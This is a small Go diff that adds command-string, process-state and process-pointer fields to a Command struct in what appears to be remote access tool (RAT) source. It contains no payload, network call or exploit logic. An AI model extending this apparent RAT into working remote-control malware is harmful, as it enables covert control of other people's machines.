@@ -31,10 +31,11 @@ import (
 type Command struct {
 	Task_id int
 	//store as raw message for now
-	Json_input json.RawMessage
-	//{Command_string
-	//	Success_message
-	//		Failure_message}
+	Json_input    json.RawMessage
+	CommandString string
+	// indicate if process using this command is being run or not
+	ProcessOn bool
+	Process   *RatProcess
 }
 
 // represents a process started by the RAT
